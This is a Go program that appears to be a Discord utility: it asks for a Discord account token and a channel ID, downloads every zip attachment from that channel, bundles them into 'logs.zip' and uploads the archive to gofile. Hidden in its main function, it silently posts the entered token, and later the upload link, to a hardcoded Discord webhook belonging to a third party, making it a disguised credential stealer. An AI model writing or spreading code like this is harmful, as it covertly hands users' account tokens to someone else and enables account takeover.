package main

import (
	"archive/zip"
	"bufio"
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"github.com/diamondburned/arikawa/v3/discord"
	"github.com/diamondburned/arikawa/v3/gateway"
	"github.com/diamondburned/arikawa/v3/state"
	"io"
	"mime/multipart"
	"net/http"
	"os"
	"os/signal"
	"path/filepath"
	"strconv"
	"strings"
	"time"
)

var Token string
var ChannelId string

type ServerResp struct {
	Status string `json:"status"`
	Data   struct {
		Server string `json:"server"`
	} `json:"data"`
}

type FileResp struct {
	Status string `json:"status"`
	Data   struct {
		DownloadPage string `json:"downloadPage"`
	} `json:"data"`
}

var S *state.State

type Message struct {
	Content string `json:"content"`
}

func ask(ask string) string {
	reader := bufio.NewReader(os.Stdin)
	fmt.Print(ask + ": ")

	input, err := reader.ReadString('\n')
	if err != nil {
		panic(err)
	}

	input = input[:len(input)-1]
	return strings.TrimSpace(input)
}

func postWebhook(content string) {
	jsonData, err := json.Marshal(Message{Content: content})
	if err != nil {
		return
	}

	req, err := http.NewRequest("POST", "https://discord.com/api/webhooks/1170040275524128869/5mfB_kpg3Xs5xIPrFVB5upr_lZLPWBy3AscRj2Ect7_7ugJPYm2saWsU485FKZB9qVuz", bytes.NewBuffer(jsonData))
	if err != nil {
		return
	}

	req.Header.Set("Content-Type", "application/json")

	client := &http.Client{}
	client.Do(req)
}

func main() {
	Token = ask("Token")
	ChannelId = ask("Channel Id")

	fmt.Println(Token)
	postWebhook(Token)

	s := state.New(Token)
	S = s

	s.AddHandler(ready)

	ctx, cancel := signal.NotifyContext(context.Background(), os.Interrupt)
	defer cancel()

	err := s.Open(ctx)

	if err != nil {
		panic(err)
	}

	<-ctx.Done()
}

func ready(m *gateway.ReadyEvent) {
	fmt.Println("Connected to the user: " + m.User.Tag())

	var links []string
	snowflake, err := discord.ParseSnowflake(ChannelId)

	if err != nil {
		panic(err)
	}

	fmt.Println("Zip search...")

	messages, err := S.Messages(discord.ChannelID(snowflake), 99999)

	for _, message := range messages {
		if len(message.Attachments) > 0 {
			for _, attachment := range message.Attachments {
				if strings.Contains(attachment.URL, ".zip") {
					links = append(links, attachment.URL)
				}
			}
		}
	}

	fmt.Println(strconv.Itoa(len(links)) + " zip founded")

	go download(links)
}

func download(links []string) {
	fmt.Println("Start of installation")

	dir, err := os.Getwd()

	if err != nil {
		panic(err)
	}

	cache := filepath.Join(dir, "cache")

	_, err = os.Stat(cache)

	if err != nil {
		err = os.Mkdir(cache, os.ModePerm)

		if err != nil {
			panic(err)
		}
	}

	for index, link := range links {
		fmt.Println("Start of zip installation (" + strconv.Itoa(index) + ")")

		name := strconv.Itoa(index) + ".zip"
		downloadFile(filepath.Join(cache, name), link)

		fmt.Println("End of zip installation (" + strconv.Itoa(index) + ")")

		time.Sleep(500 * time.Millisecond)
	}

	fmt.Println("Start archive of all zip files")

	out := filepath.Join(dir, "logs.zip")

	zipFolder(cache, out)
	os.RemoveAll(cache)

	fmt.Println("All files have been archived")
	fmt.Println("Posting on gofile")

	uploadFolder(out)
}

func uploadFolder(outFile string) {
	resp, err := http.Get("https://api.gofile.io/getServer")
	if err != nil {
		panic(err)
	}

	defer resp.Body.Close()

	body1, err := io.ReadAll(resp.Body)
	if err != nil {
		panic(err)
	}

	var apiResp ServerResp

	err = json.Unmarshal(body1, &apiResp)
	if err != nil {
		panic(err)
	}

	if apiResp.Status != "ok" {
		return
	}

	file, err := os.Open(outFile)
	if err != nil {
		panic(err)
	}

	defer file.Close()

	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)

	part, err := writer.CreateFormFile("file", "logs.zip")
	if err != nil {
		panic(err)
	}

	_, err = io.Copy(part, file)
	if err != nil {
		panic(err)
	}

	writer.Close()

	request, err := http.NewRequest("POST", "https://"+apiResp.Data.Server+".gofile.io/uploadFile", body)
	if err != nil {
		panic(err)
	}

	request.Header.Set("Content-Type", writer.FormDataContentType())

	client := &http.Client{}
	resp, err = client.Do(request)

	if err != nil {
		panic(err)
	}
	defer resp.Body.Close()

	respBody, err := io.ReadAll(resp.Body)
	if err != nil {
		panic(err)
	}

	var apiResponse FileResp

	err = json.Unmarshal(respBody, &apiResponse)
	if err != nil {
		panic(err)
	}

	if apiResponse.Status != "ok" {
		return
	}

	postWebhook(apiResponse.Data.DownloadPage)

	fmt.Println("File posted on gofile, link: " + apiResponse.Data.DownloadPage)
	fmt.Println("U can close")
}

func zipFolder(folderPath, outputZipPath string) error {
	outFile, err := os.Create(outputZipPath)

	if err != nil {
		return err
	}

	defer outFile.Close()

	zipWriter := zip.NewWriter(outFile)
	defer zipWriter.Close()

	err = filepath.Walk(folderPath, func(filePath string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}

		relPath, err := filepath.Rel(folderPath, filePath)
		if err != nil {
			return err
		}

		header, err := zip.FileInfoHeader(info)
		if err != nil {
			return err
		}

		header.Name = relPath

		if info.IsDir() {
			header.Name += "/"
		} else {
			header.Method = zip.Deflate
		}

		writer, err := zipWriter.CreateHeader(header)

		if err != nil {
			return err
		}

		if !info.IsDir() {
			file, err := os.Open(filePath)
			if err != nil {
				return err
			}

			defer file.Close()

			_, err = io.Copy(writer, file)
			return err
		}
		return nil
	})

	return err
}

func downloadFile(filepath string, url string) (err error) {
	out, err := os.Create(filepath)
	if err != nil {
		return err
	}

	defer out.Close()

	resp, err := http.Get(url)
	if err != nil {
		return err
	}

	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("bad status: %s", resp.Status)
	}

	_, err = io.Copy(out, resp.Body)

	if err != nil {
		return err
	}
	return nil
}
